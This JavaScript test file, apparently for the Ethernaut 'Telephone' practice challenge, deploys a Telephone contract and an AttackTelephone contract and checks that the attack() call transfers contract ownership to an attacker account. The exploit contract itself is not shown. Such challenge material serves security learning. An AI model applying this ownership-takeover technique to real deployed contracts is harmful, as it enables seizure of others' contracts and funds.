const { expect } = require("chai");
const { ethers } = require("hardhat");
const { MaxUint256 } = require("@ethersproject/constants");
const { BigNumber } = require("ethers");

describe("test", function () {
    var Telephone;
    var AttackTelephone;
    it("init params", async function () {
        [deployer, ...users] = await ethers.getSigners();
    });
    it("deploy", async function () {
        const TelephoneInstance = await ethers.getContractFactory("Telephone");
        Telephone = await TelephoneInstance.deploy();
        const AttackTelephoneInstance = await ethers.getContractFactory("AttackTelephone");
        AttackTelephone = await AttackTelephoneInstance.connect(users[0]).deploy(Telephone.address);
    });
    it("hack test", async function () {
        expect(await Telephone.owner()).to.equal(deployer.address);
        await AttackTelephone.attack();
        expect(await Telephone.owner()).to.equal(users[0].address);
    });
});
